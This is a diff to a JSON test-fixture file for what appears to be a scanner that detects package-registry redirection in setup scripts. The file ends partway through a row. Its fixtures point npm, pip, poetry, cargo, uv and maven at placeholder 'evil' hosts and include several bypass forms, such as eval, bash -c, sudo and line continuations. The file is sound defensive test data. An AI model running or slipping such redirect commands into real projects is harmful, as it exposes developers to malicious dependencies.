@@ -1,6 +1,6 @@
 {
   "schema_version": 1,
-  "expected_row_count": 20,
+  "expected_row_count": 85,
   "rows": [
     {
       "id": "pipconf-colon-delimiter",
@@ -407,9 +407,1649 @@
       ]
     },
     {
+      "id": "no-logical-line-joining-bypass",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n\nyarn config set registry \\\n  https://packages.example.invalid\n\npoetry source add fixture \\\n  https://packages.example.invalid\n\npoetry config repositories.fixture \\\n  https://packages.example.invalid\n\nmvn -Dmaven.repo.remote=\\\nhttps://packages.example.invalid install\n\nexport NPM_CONFIG_REGISTRY=\\\nhttps://packages.example.invalid\n\nNPM_CONFIG_REGISTRY=\\\nhttps://packages.example.invalid npm install\n\npip config set global.index-url \\\n  https://packages.example.invalid/simple\n\nexport PIP_INDEX_URL=\\\nhttps://packages.example.invalid/simple\n\nnpm config set @fixture:registry \\\n  https://packages.example.invalid\n\nnpm config set registry \"https://packages.example\\\n.invalid\"\n\nnpm config set registry https://packages.example\\\n.invalid\n\nnp\\\nm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 7
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "set",
+          "scope": "repository",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 10
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 15,
+          "end_line": 16
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 18,
+          "end_line": 19
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 22
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 24,
+          "end_line": 25
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 28
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 30,
+          "end_line": 31
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 33,
+          "end_line": 34
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 37
+        }
+      ]
+    },
+    {
+      "id": "continuation-assignment-evidence-corruption",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nURL=\\\nhttps://evil.invalid\nnpm config set registry \"$URL\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        }
+      ]
+    },
+    {
+      "id": "no-logical-line-joining-false-positive",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho installing \\\nnpm config set registry https://x.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "multiline-quoted-string-not-masked",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nprintf '%s\\n' \"Never run:\nnpm config set registry https://packages.example.invalid\ninside quoted data.\"\n\n# case 2\n#!/bin/bash\nMESSAGE='Never run:\nnpm config set registry https://packages.example.invalid\n'\nprintf '%s\\n' \"$MESSAGE\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "non-shell-line-boundaries",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho a \f npm config set registry https://x.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "npm-absolute-path-executable",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n/usr/local/bin/npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "exec-allowlist-path-qualified-and-versioned",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n.venv/bin/pip install --index-url https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "path-qualified-command-word",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n/usr/local/bin/npm config set registry https://packages.example.invalid\n\n# case 2\n#!/bin/bash\n./node_modules/.bin/npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
+        }
+      ]
+    },
+    {
+      "id": "ampersand-not-a-control-operator",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho warming-up & npm config set registry https://packages.example.invalid\n\n# case 2\n#!/bin/bash\nsleep 1 & npm config set registry https://packages.example.invalid & wait\n\n# case 3\n#!/bin/bash\necho ready & export NPM_CONFIG_REGISTRY=https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 10
+        }
+      ]
+    },
+    {
+      "id": "reserved-words-in-command-position",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nif npm config set registry https://packages.example.invalid; then\n  echo ok\nfi\n\n# additional forms\nwhile npm config set registry https://packages.example.invalid; do break; done\nuntil npm config set registry https://packages.example.invalid; do sleep 1; done\nif false; then :; elif npm config set registry https://packages.example.invalid; then :; fi\n! npm config set registry https://packages.example.invalid\ntime npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 7
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 8
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 9
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 10
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 11
+        }
+      ]
+    },
+    {
+      "id": "single-line-function-definition",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsetup() { npm config set registry https://packages.example.invalid; }\nsetup\n\n# case 2\n#!/bin/bash\nfunction setup_two { npm config set registry https://packages.example.invalid; }\nsetup_two\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 7
+        }
+      ]
+    },
+    {
+      "id": "leading-redirection-prefix",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n2>/dev/null npm config set registry https://packages.example.invalid\n\n# case 2\n#!/bin/bash\n>/dev/null npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
+        }
+      ]
+    },
+    {
+      "id": "case-arm-pattern-forms",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncase \"$1\" in\n  (setup) npm config set registry https://packages.example.invalid ;;\nesac\n\n# case 2\n#!/bin/bash\ncase \"$1\" in\n  \"setup\") npm config set registry https://packages.example.invalid ;;\nesac\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 9
+        }
+      ]
+    },
+    {
+      "id": "redirection-word-consumed-as-destination",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set global.index-url >/dev/null https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "redirection-fd-prefixed-silences-finding",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add 2>/dev/null private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-yarn-wrapper-corepack-npx",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncorepack npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-nested-shell-string",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nbash -c \"npm config set registry https://packages.example.invalid\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "exec-preserving-prefix-wrappers",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nexec npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "string-to-argv-execution",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\neval \"npm config set registry https://packages.example.invalid\"\nbash -c \"npm config set registry https://packages.example.invalid\"\nsh -c 'npm config set registry https://packages.example.invalid'\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 4
+        }
+      ]
+    },
+    {
+      "id": "wrapper-option-allowlist-fails-to-silent",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsudo -k npm config set registry https://packages.example.invalid\n\n# additional forms\nsudo -i npm config set registry https://packages.example.invalid\nsudo --login npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 5
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 6
+        }
+      ]
+    },
+    {
+      "id": "npm-flags-before-operands",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set --location=project registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "yarn-flags-before-operands",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set -H npmRegistryServer https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "flag-between-operands-corrupts-destination",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry --location=project https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-multi-pair-second-destination-dropped",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://first.example.invalid @fixture:registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://first.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        },
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-yarn-registry-cli-flag-unmodeled",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm install --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "yarn-npmscopes-command-form",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set npmScopes.acme.npmRegistryServer https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "scoped",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-flag-before-subcommand",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config --location=project set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-subcommand-aliases",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm c set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "npm-argv-terminator",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set -- registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "pnpm-unmodeled",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npnpm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pnpm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "pip-config-set-early-return-non-global-key",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set install.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "command",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "pip-config-file-option-before-subcommand",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config --user set global.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "poetry-global-options-before-subcommand",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry -C . source add --priority explicit private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "poetry-config-local-flag-before-key",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry config --local repositories.foo.url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "set",
+          "scope": "project",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "poetry-option-operand-consumed-multi",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add --priority explicit --no-interaction private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "cargo-has-no-command-branch",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncargo --config 'registries.evil.index=\"https://evil.example.invalid/index\"' build\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "cargo",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "registry",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "pip-short-option-bundling",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip install -ihttps://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "maven-settings-file-flag-and-unrecognised-filename",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn -s ci-settings.xml install\n",
+        "ci-settings.xml": "<settings>\n  <mirrors>\n    <mirror>\n      <id>fixture</id>\n      <mirrorOf>*</mirrorOf>\n      <url>https://packages.example.invalid/repository</url>\n    </mirror>\n  </mirrors>\n</settings>\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "maven",
+          "surface": "maven-config",
+          "operation": "replace",
+          "scope": "mirror",
+          "destination": "https://packages.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "ci-settings.xml",
+          "start_line": 6
+        }
+      ]
+    },
+    {
+      "id": "uv-entirely-uncovered",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nuv pip install --index-url https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "uv",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
